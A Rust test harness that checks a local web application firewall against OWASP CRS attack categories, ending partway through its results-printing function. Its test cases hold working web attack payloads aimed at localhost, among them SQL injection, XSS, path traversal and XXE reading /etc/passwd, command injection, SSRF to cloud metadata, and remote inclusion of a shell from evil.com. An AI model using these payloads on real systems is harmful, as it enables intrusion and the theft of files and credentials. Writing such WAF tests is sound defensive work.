use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::{Child, Command};
use tokio::time::sleep;

#[derive(Debug)]
struct AdvancedTestMetrics {
    total_requests: AtomicU64,
    successful_requests: AtomicU64,
    failed_requests: AtomicU64,
    waf_blocks: AtomicU64,
    backend_responses: AtomicU64,

    // OWASP CRS Attack Categories
    sql_injection_blocked: AtomicU64,
    xss_blocked: AtomicU64,
    path_traversal_blocked: AtomicU64,
    rfi_blocked: AtomicU64,
    rce_blocked: AtomicU64,
    java_blocked: AtomicU64,
    protocol_blocked: AtomicU64,
    method_blocked: AtomicU64,
    scanner_blocked: AtomicU64,
    session_blocked: AtomicU64,
    dos_blocked: AtomicU64,
    ldap_blocked: AtomicU64,
    xxe_blocked: AtomicU64,
    ssrf_blocked: AtomicU64,

    secret_leakage_filtered: AtomicU64,
    http1_0_requests: AtomicU64,
    http1_1_requests: AtomicU64,
    http2_requests: AtomicU64,
    http3_requests: AtomicU64,
    total_latency_ms: AtomicU64,
    min_latency_ms: AtomicU64,
    max_latency_ms: AtomicU64,
}

impl AdvancedTestMetrics {
    fn new() -> Self {
        Self {
            total_requests: AtomicU64::new(0),
            successful_requests: AtomicU64::new(0),
            failed_requests: AtomicU64::new(0),
            waf_blocks: AtomicU64::new(0),
            backend_responses: AtomicU64::new(0),

            // OWASP CRS Attack Categories
            sql_injection_blocked: AtomicU64::new(0),
            xss_blocked: AtomicU64::new(0),
            path_traversal_blocked: AtomicU64::new(0),
            rfi_blocked: AtomicU64::new(0),
            rce_blocked: AtomicU64::new(0),
            java_blocked: AtomicU64::new(0),
            protocol_blocked: AtomicU64::new(0),
            method_blocked: AtomicU64::new(0),
            scanner_blocked: AtomicU64::new(0),
            session_blocked: AtomicU64::new(0),
            dos_blocked: AtomicU64::new(0),
            ldap_blocked: AtomicU64::new(0),
            xxe_blocked: AtomicU64::new(0),
            ssrf_blocked: AtomicU64::new(0),

            secret_leakage_filtered: AtomicU64::new(0),
            http1_0_requests: AtomicU64::new(0),
            http1_1_requests: AtomicU64::new(0),
            http2_requests: AtomicU64::new(0),
            http3_requests: AtomicU64::new(0),
            total_latency_ms: AtomicU64::new(0),
            min_latency_ms: AtomicU64::new(u64::MAX),
            max_latency_ms: AtomicU64::new(0),
        }
    }

    fn record_request(
        &self,
        latency_ms: u64,
        was_blocked: bool,
        reached_backend: bool,
        attack_type: Option<&str>,
        http_version: &str,
        response_body: &str,
    ) {
        self.total_requests.fetch_add(1, Ordering::Relaxed);

        if was_blocked {
            self.waf_blocks.fetch_add(1, Ordering::Relaxed);
            self.failed_requests.fetch_add(1, Ordering::Relaxed);

            // Track specific attack types blocked
            if let Some(attack) = attack_type {
                match attack {
                    "sql_injection" => {
                        self.sql_injection_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "xss" => {
                        self.xss_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "path_traversal" => {
                        self.path_traversal_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "rfi" => {
                        self.rfi_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "rce" => {
                        self.rce_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "java" => {
                        self.java_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "protocol" => {
                        self.protocol_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "method" => {
                        self.method_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "scanner" => {
                        self.scanner_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "session" => {
                        self.session_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "dos" => {
                        self.dos_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "ldap" => {
                        self.ldap_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "xxe" => {
                        self.xxe_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    "ssrf" => {
                        self.ssrf_blocked.fetch_add(1, Ordering::Relaxed);
                    }
                    _ => {}
                }
            }
        } else {
            self.successful_requests.fetch_add(1, Ordering::Relaxed);
        }

        if reached_backend {
            self.backend_responses.fetch_add(1, Ordering::Relaxed);
        }

        // Check for secret leakage filtering
        if response_body.contains("SECRETS_LEAKED")
            || response_body.contains("database_password")
            || response_body.contains("X-Internal-Token")
        {
            // WAF should have filtered this out - this is a failure
        } else if response_body.contains("advanced-test-backend") {
            // Secrets were properly filtered
            self.secret_leakage_filtered.fetch_add(1, Ordering::Relaxed);
        }

        // Track HTTP version usage
        match http_version {
            "HTTP/1.0" => {
                self.http1_0_requests.fetch_add(1, Ordering::Relaxed);
            }
            "HTTP/1.1" => {
                self.http1_1_requests.fetch_add(1, Ordering::Relaxed);
            }
            "HTTP/2" => {
                self.http2_requests.fetch_add(1, Ordering::Relaxed);
            }
            "HTTP/3" => {
                self.http3_requests.fetch_add(1, Ordering::Relaxed);
            }
            _ => {}
        }

        self.total_latency_ms
            .fetch_add(latency_ms, Ordering::Relaxed);

        // Update latency bounds
        let mut current_min = self.min_latency_ms.load(Ordering::Relaxed);
        while latency_ms < current_min {
            match self.min_latency_ms.compare_exchange_weak(
                current_min,
                latency_ms,
                Ordering::Relaxed,
                Ordering::Relaxed,
            ) {
                Ok(_) => break,
                Err(new_min) => current_min = new_min,
            }
        }

        let mut current_max = self.max_latency_ms.load(Ordering::Relaxed);
        while latency_ms > current_max {
            match self.max_latency_ms.compare_exchange_weak(
                current_max,
                latency_ms,
                Ordering::Relaxed,
                Ordering::Relaxed,
            ) {
                Ok(_) => break,
                Err(new_max) => current_max = new_max,
            }
        }
    }
}

struct OWASPComprehensiveTestHarness {
    backend_process: Option<Child>,
    waf_process: Option<Child>,
}

impl OWASPComprehensiveTestHarness {
    async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        println!("🔒 OWASP CRS COMPREHENSIVE SECURITY TEST HARNESS");
        println!("===============================================");
        println!("🎯 Mission: Enterprise-grade OWASP CRS compliance validation");
        println!("📊 Components: WAF-Rejected + Advanced OWASP Attack Suite");
        println!("🔐 Security Focus: 40+ OWASP CRS attack vectors with categorization");
        println!();

        Ok(Self {
            backend_process: None,
            waf_process: None,
        })
    }

    async fn start_advanced_backend(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        println!("🚀 Starting Advanced Test Backend...");

        let mut backend_cmd = Command::new("./target/release/advanced_test_backend");
        backend_cmd.env("BACKEND_PORT", "3000");

        self.backend_process = Some(backend_cmd.spawn()?);

        // Wait for backend to be ready
        for attempt in 1..=10 {
            match tokio::net::TcpStream::connect("127.0.0.1:3000").await {
                Ok(_) => {
                    println!("✅ Advanced Test Backend ready on http://127.0.0.1:3000");
                    return Ok(());
                }
                Err(_) => {
                    if attempt < 10 {
                        println!("   ⏳ Waiting for backend... (attempt {}/10)", attempt);
                        sleep(Duration::from_millis(500)).await;
                    }
                }
            }
        }

        println!("⚠️  Backend not responding, but continuing...");
        sleep(Duration::from_secs(2)).await;
        Ok(())
    }

    async fn start_waf(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        println!("🛡️  Starting WAF-Rejected with OWASP CRS configuration...");

        let mut waf_cmd = Command::new("./target/release/waf-ingress");
        waf_cmd.env("WAF_CONFIG_FILE", "config-test");

        self.waf_process = Some(waf_cmd.spawn()?);

        // Wait for WAF to be ready
        for attempt in 1..=15 {
            match tokio::net::TcpStream::connect("127.0.0.1:8080").await {
                Ok(_) => {
                    println!("✅ WAF-Rejected ready on http://127.0.0.1:8080");
                    println!("🔗 WAF → Backend pipeline established for OWASP testing");
                    return Ok(());
                }
                Err(_) => {
                    if attempt < 15 {
                        println!("   ⏳ Waiting for WAF... (attempt {}/15)", attempt);
                        sleep(Duration::from_millis(1000)).await;
                    }
                }
            }
        }

        println!("⚠️  WAF not responding, but continuing...");
        sleep(Duration::from_secs(3)).await;
        Ok(())
    }

    async fn run_owasp_comprehensive_test(
        &self,
    ) -> Result<AdvancedTestMetrics, Box<dyn std::error::Error>> {
        println!("🔒 Running OWASP CRS Comprehensive Security Test Suite");
        println!("====================================================");

        let metrics = Arc::new(AdvancedTestMetrics::new());
        let test_cases = self.create_owasp_test_cases();

        println!(
            "🧪 Executing {} OWASP CRS security test cases...",
            test_cases.len()
        );
        println!();

        for (i, (test_name, http_request, http_version, attack_type, should_be_blocked)) in
            test_cases.iter().enumerate()
        {
            let test_num = i + 1;
            let total_tests = test_cases.len();

            print!(
                "[{:2}/{:2}] 🔍 {}: {} ... ",
                test_num,
                total_tests,
                attack_type
                    .as_ref()
                    .unwrap_or(&"legitimate".to_string())
                    .to_uppercase(),
                test_name
            );
            std::io::Write::flush(&mut std::io::stdout()).unwrap();

            let start = Instant::now();

            match tokio::time::timeout(
                Duration::from_secs(15),
                self.make_http_request(http_request),
            )
            .await
            {
                Ok(Ok((status, response_body))) => {
                    let latency_ms = start.elapsed().as_millis() as u64;
                    let was_blocked = status == 403 || status == 429;
                    let reached_backend = response_body.contains("advanced-test-backend");

                    // Validate test expectations
                    if *should_be_blocked && !was_blocked {
                        println!("❌ FAILURE (Status: {})", status);
                        println!(
                            "   Expected: BLOCKED, Got: ALLOWED - This attack should be stopped!"
                        );
                    } else if *should_be_blocked && was_blocked {
                        println!("✅ SUCCESS (Blocked)");
                    } else if !*should_be_blocked && was_blocked {
                        println!("⚠️  FALSE POSITIVE (Status: {})", status);
                        println!("   Expected: ALLOWED, Got: BLOCKED - Legitimate traffic blocked");
                    } else {
                        println!("✅ PASS (Status: {})", status);
                    }

                    metrics.record_request(
                        latency_ms,
                        was_blocked,
                        reached_backend,
                        attack_type.as_deref(),
                        http_version,
                        &response_body,
                    );
                }
                Ok(Err(e)) => {
                    let latency_ms = start.elapsed().as_millis() as u64;
                    println!("❌ CONNECTION ERROR: {}", e);
                    metrics.record_request(
                        latency_ms,
                        true,
                        false,
                        attack_type.as_deref(),
                        http_version,
                        "",
                    );
                }
                Err(_) => {
                    let latency_ms = start.elapsed().as_millis() as u64;
                    println!("⏱️  TIMEOUT (15s)");
                    metrics.record_request(
                        latency_ms,
                        true,
                        false,
                        attack_type.as_deref(),
                        http_version,
                        "",
                    );
                }
            }

            // Progress indicator every 10 tests
            if test_num % 10 == 0 && test_num < total_tests {
                println!(
                    "   📊 Progress: {:.1}% complete",
                    (test_num as f64 / total_tests as f64) * 100.0
                );
                println!();
            }

            // Small delay between tests
            sleep(Duration::from_millis(100)).await;
        }

        println!();
        println!("🏁 All OWASP CRS security tests completed!");
        Ok(Arc::try_unwrap(metrics).unwrap())
    }

    fn create_owasp_test_cases(&self) -> Vec<(String, String, String, Option<String>, bool)> {
        vec![
            // HTTP/1.1 Legitimate Requests
            (
                "Basic GET request".to_string(),
                "GET /api/users HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),
            (
                "JSON POST request".to_string(),
                "POST /api/data HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 25\r\nConnection: close\r\n\r\n{\"data\":\"normal request\"}".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),
            (
                "Form POST request".to_string(),
                "POST /api/form HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 23\r\nConnection: close\r\n\r\nname=john&email=john@example.com".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),

            // OWASP CRS 942xxx - SQL Injection Attacks (SHOULD BE BLOCKED)
            (
                "Classic OR 1=1 attack".to_string(),
                "GET /api/users?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "UNION SELECT attack".to_string(),
                "GET /api/users?id=1%20UNION%20SELECT%20%2A%20FROM%20users HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "Comment bypass (--) attack".to_string(),
                "GET /api/users?id=1%27%3B-- HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "Boolean-based blind SQLi".to_string(),
                "GET /api/users?id=1%20AND%201%3D1 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "Time-based blind SQLi".to_string(),
                "GET /api/users?id=1;WAITFOR%20DELAY%20'00:00:05'-- HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),
            (
                "Error-based SQLi".to_string(),
                "GET /api/users?id=1%20AND%20EXTRACTVALUE(1,%20CONCAT(0x7e,%20(SELECT%20version()),%200x7e)) HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("sql_injection".to_string()),
                true
            ),

            // OWASP CRS 941xxx - XSS Attacks (SHOULD BE BLOCKED)
            (
                "Script tag injection".to_string(),
                "GET /api/search?q=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "JavaScript protocol injection".to_string(),
                "GET /api/redirect?url=javascript%3Aalert%28document.cookie%29 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "Event handler injection".to_string(),
                "GET /api/profile?name=%3Cimg%20onerror%3Dalert%281%29%20src%3Dx%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "SVG-based XSS".to_string(),
                "GET /api/upload?file=%3Csvg%20onload%3Dalert(1)%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "IE conditional comment XSS".to_string(),
                "GET /api/search?q=%3C!--[if%20IE]%3E%3Cscript%3Ealert(1)%3C/script%3E%3C![endif]--%3E HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),
            (
                "POST body XSS injection".to_string(),
                "POST /api/comment HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/json\r\nContent-Length: 41\r\nConnection: close\r\n\r\n{\"comment\":\"<script>alert(xss)</script>\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("xss".to_string()),
                true
            ),

            // OWASP CRS 930xxx - Local File Inclusion / Path Traversal (SHOULD BE BLOCKED)
            (
                "Unix path traversal (/etc/passwd)".to_string(),
                "GET /api/file?path=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("path_traversal".to_string()),
                true
            ),
            (
                "Windows path traversal".to_string(),
                "GET /api/file?path=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("path_traversal".to_string()),
                true
            ),
            (
                "Null byte injection".to_string(),
                "GET /api/file?path=..%2F..%2F..%2Fetc%2Fpasswd%00.jpg HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("path_traversal".to_string()),
                true
            ),

            // OWASP CRS 931xxx - Remote File Inclusion (SHOULD BE BLOCKED)
            (
                "HTTP protocol RFI".to_string(),
                "GET /api/include?file=http://evil.com/shell.txt HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rfi".to_string()),
                true
            ),
            (
                "FTP protocol RFI".to_string(),
                "GET /api/include?file=ftp://evil.com/shell.php HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rfi".to_string()),
                true
            ),
            (
                "PHP wrapper RFI".to_string(),
                "GET /api/include?file=php://input HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rfi".to_string()),
                true
            ),

            // OWASP CRS 932xxx - Remote Code Execution (SHOULD BE BLOCKED)
            (
                "Command injection (semicolon)".to_string(),
                "GET /api/ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),
            (
                "Command injection (pipe)".to_string(),
                "GET /api/ping?host=127.0.0.1|whoami HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),
            (
                "Command injection (backticks)".to_string(),
                "GET /api/ping?host=%60id%60 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),
            (
                "PowerShell injection".to_string(),
                "GET /api/cmd?command=powershell%20-Command%20Get-Process HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("rce".to_string()),
                true
            ),

            // OWASP CRS 944xxx - Java Attacks (SHOULD BE BLOCKED)
            (
                "Java deserialization attack".to_string(),
                "POST /api/deserialize HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/x-java-serialized-object\r\nContent-Length: 50\r\nConnection: close\r\n\r\naced00057372001java.util.HashMap05071478d40000".to_string(),
                "HTTP/1.1".to_string(),
                Some("java".to_string()),
                true
            ),
            (
                "Java Runtime.getRuntime() exploit".to_string(),
                "GET /api/eval?expr=Runtime.getRuntime().exec(\"whoami\") HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("java".to_string()),
                true
            ),

            // OWASP CRS 920xxx - Protocol Violations (SHOULD BE BLOCKED)
            (
                "Invalid HTTP method".to_string(),
                "INVALID /test HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("protocol".to_string()),
                true
            ),
            (
                "GET with body violation".to_string(),
                "GET /test HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Length: 10\r\nConnection: close\r\n\r\ntest=value".to_string(),
                "HTTP/1.1".to_string(),
                Some("protocol".to_string()),
                true
            ),
            (
                "Missing Content-Length".to_string(),
                "POST /api/data HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n{\"test\":\"data\"}".to_string(),
                "HTTP/1.1".to_string(),
                Some("protocol".to_string()),
                true
            ),

            // OWASP CRS 911xxx - Method Policy (SHOULD BE BLOCKED)
            (
                "TRACE method".to_string(),
                "TRACE /test HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("method".to_string()),
                true
            ),
            (
                "CONNECT method".to_string(),
                "CONNECT 127.0.0.1:80 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("method".to_string()),
                true
            ),

            // OWASP CRS 913xxx - Scanner Detection (SHOULD BE BLOCKED)
            (
                "Nikto scanner user-agent".to_string(),
                "GET /admin HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Nikto/2.1.6\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("scanner".to_string()),
                true
            ),
            (
                "Nessus scanner user-agent".to_string(),
                "GET /admin HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: Mozilla/4.0 (compatible; Nessus)\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("scanner".to_string()),
                true
            ),
            (
                "SQLMap scanner user-agent".to_string(),
                "GET /login HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nUser-Agent: sqlmap/1.0\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("scanner".to_string()),
                true
            ),

            // OWASP CRS 943xxx - Session Fixation (SHOULD BE BLOCKED)
            (
                "Session fixation via cookie".to_string(),
                "GET /login HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nCookie: PHPSESSID=attacker123\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("session".to_string()),
                true
            ),
            (
                "Session fixation via URL".to_string(),
                "GET /login?JSESSIONID=ATTACKER123456789 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("session".to_string()),
                true
            ),

            // DoS/Resource Exhaustion Attacks (SHOULD BE BLOCKED)
            (
                "Slowloris attack".to_string(),
                "GET /test/slowloris HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nX-Slow-Header: true\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("dos".to_string()),
                true
            ),
            (
                "Large header attack".to_string(),
                format!("GET /test/zip-bomb HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nX-Large-Header: {}\r\nConnection: close\r\n\r\n", "A".repeat(10000)),
                "HTTP/1.1".to_string(),
                Some("dos".to_string()),
                true
            ),

            // LDAP Injection (SHOULD BE BLOCKED)
            (
                "LDAP injection attack".to_string(),
                "GET /api/ldap?filter=(&(uid=admin)(|(uid=*)(uid=admin))) HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("ldap".to_string()),
                true
            ),

            // XML/XXE Attacks (SHOULD BE BLOCKED)
            (
                "XXE external entity injection".to_string(),
                "POST /api/xml HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nContent-Type: application/xml\r\nContent-Length: 89\r\nConnection: close\r\n\r\n<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>".to_string(),
                "HTTP/1.1".to_string(),
                Some("xxe".to_string()),
                true
            ),

            // Server-Side Request Forgery (SHOULD BE BLOCKED)
            (
                "SSRF internal network access".to_string(),
                "GET /api/fetch?url=http://127.0.0.1:22 HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("ssrf".to_string()),
                true
            ),
            (
                "SSRF cloud metadata access".to_string(),
                "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                Some("ssrf".to_string()),
                true
            ),

            // Secret Leakage Tests (Response should be filtered)
            (
                "Admin endpoint access".to_string(),
                "GET /admin/secrets HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false // Request allowed, but response should be filtered
            ),
            (
                "Internal config access".to_string(),
                "GET /internal/config HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false // Request allowed, but response should be filtered
            ),

            // Protocol Version Tests
            (
                "HTTP version compatibility".to_string(),
                "GET /test/http-versions HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),

            // Compression Tests
            (
                "Compression support".to_string(),
                "GET /test/compression HTTP/1.1\r\nHost: 127.0.0.1:8080\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\n\r\n".to_string(),
                "HTTP/1.1".to_string(),
                None,
                false
            ),
        ]
    }

    async fn make_http_request(
        &self,
        request: &str,
    ) -> Result<(u16, String), Box<dyn std::error::Error>> {
        // Add timeout for connection
        let stream = tokio::time::timeout(
            Duration::from_secs(5),
            tokio::net::TcpStream::connect("127.0.0.1:8080"),
        )
        .await??;

        let mut stream = stream;

        // Add timeout for writing request
        tokio::time::timeout(Duration::from_secs(2), stream.write_all(request.as_bytes()))
            .await??;

        // Add timeout for reading response
        let mut buffer = vec![0; 16384];
        let n = tokio::time::timeout(Duration::from_secs(10), stream.read(&mut buffer)).await??;

        let response = String::from_utf8_lossy(&buffer[..n]);

        // Parse status code from HTTP response
        let status_code = if let Some(line) = response.lines().next() {
            if let Some(parts) = line.split_whitespace().nth(1) {
                parts.parse::<u16>().unwrap_or(500)
            } else {
                500
            }
        } else {
            500
        };

        Ok((status_code, response.to_string()))
    }

    async fn shutdown(&mut self) {
        println!("🛑 Shutting down OWASP comprehensive test harness...");

        if let Some(mut waf) = self.waf_process.take() {
            let _ = waf.kill().await;
            println!("   ✅ WAF process terminated");
        }

        if let Some(mut backend) = self.backend_process.take() {
            let _ = backend.kill().await;
            println!("   ✅ Backend process terminated");
        }

        println!("🏁 OWASP comprehensive test harness shutdown complete");
    }
}

fn print_owasp_comprehensive_results(metrics: &AdvancedTestMetrics, test_duration: f64) {
    let total = metrics.total_requests.load(Ordering::Relaxed);
    let successful = metrics.successful_requests.load(Ordering::Relaxed);
    let failed = metrics.failed_requests.load(Ordering::Relaxed);
    let waf_blocks = metrics.waf_blocks.load(Ordering::Relaxed);
    let backend_responses = metrics.backend_responses.load(Ordering::Relaxed);

    // Load OWASP CRS attack metrics
    let sql_blocked = metrics.sql_injection_blocked.load(Ordering::Relaxed);
    let xss_blocked = metrics.xss_blocked.load(Ordering::Relaxed);
    let traversal_blocked = metrics.path_traversal_blocked.load(Ordering::Relaxed);
    let rfi_blocked = metrics.rfi_blocked.load(Ordering::Relaxed);
    let rce_blocked = metrics.rce_blocked.load(Ordering::Relaxed);
    let java_blocked = metrics.java_blocked.load(Ordering::Relaxed);
    let protocol_blocked = metrics.protocol_blocked.load(Ordering::Relaxed);
    let method_blocked = metrics.method_blocked.load(Ordering::Relaxed);
    let scanner_blocked = metrics.scanner_blocked.load(Ordering::Relaxed);
    let session_blocked = metrics.session_blocked.load(Ordering::Relaxed);
    let dos_blocked = metrics.dos_blocked.load(Ordering::Relaxed);
    let ldap_blocked = metrics.ldap_blocked.load(Ordering::Relaxed);
    let xxe_blocked = metrics.xxe_blocked.load(Ordering::Relaxed);
    let ssrf_blocked = metrics.ssrf_blocked.load(Ordering::Relaxed);
    let secrets_filtered = metrics.secret_leakage_filtered.load(Ordering::Relaxed);

    let http1_0 = metrics.http1_0_requests.load(Ordering::Relaxed);
    let http1_1 = metrics.http1_1_requests.load(Ordering::Relaxed);
    let http2 = metrics.http2_requests.load(Ordering::Relaxed);
    let http3 = metrics.http3_requests.load(Ordering::Relaxed);

    let total_latency = metrics.total_latency_ms.load(Ordering::Relaxed);
    let min_latency = metrics.min_latency_ms.load(Ordering::Relaxed);
    let max_latency = metrics.max_latency_ms.load(Ordering::Relaxed);

    let rps = total as f64 / test_duration;
    let avg_latency = if total > 0 {
        total_latency as f64 / total as f64
    } else {
        0.0
    };
    let block_rate = if total > 0 {
        (waf_blocks as f64 / total as f64) * 100.0
    } else {
        0.0
    };

    println!();
    println!("🔒 OWASP CRS COMPREHENSIVE SECURITY TEST RESULTS");
    println!("==============================================");
    println!("📊 Overall Statistics:");
    println!("   🎯 Total Requests: {}", total);
    println!("   ✅ Successful: {}", successful);
    println!("   ❌ Failed/Blocked: {}", failed);
    println!("   🛡️  WAF Blocks: {} ({:.1}%)", waf_blocks, block_rate);
    println!("   🎭 Backend Responses: {}", backend_responses);
    println!("   ⚡ Requests/Second: {:.0}", rps);
    println!("   📈 Average Latency: {:.2}ms", avg_latency);
    println!(
        "   ⬇️  Min Latency: {}ms",
        if min_latency == u64::MAX {
            0
        } else {
            min_latency
        }
    );
    println!("   ⬆️  Max Latency: {}ms", max_latency);
    println!();

    println!("🔐 OWASP CRS Security Attack Analysis:");
    println!("   💉 SQL Injection (942xxx) Blocked: {}/6", sql_blocked);
    println!("   🕸️  XSS Attacks (941xxx) Blocked: {}/6", xss_blocked);
    println!(
        "   📁 Local File Inc. (930xxx) Blocked: {}/3",
        traversal_blocked
    );
    println!("   🌐 Remote File Inc. (931xxx) Blocked: {}/3", rfi_blocked);
    println!(
        "   💻 Remote Code Exec. (932xxx) Blocked: {}/4",
        rce_blocked
    );
    println!("   ☕ Java Attacks (944xxx) Blocked: {}/2", java_blocked);
    println!(
        "   📋 Protocol Viol. (920xxx) Blocked: {}/3",
        protocol_blocked
    );
    println!("   🔧 Method Policy (911xxx) Blocked: {}/2", method_blocked);
    println!(
        "   🔍 Scanner Detection (913xxx) Blocked: {}/3",
        scanner_blocked
    );
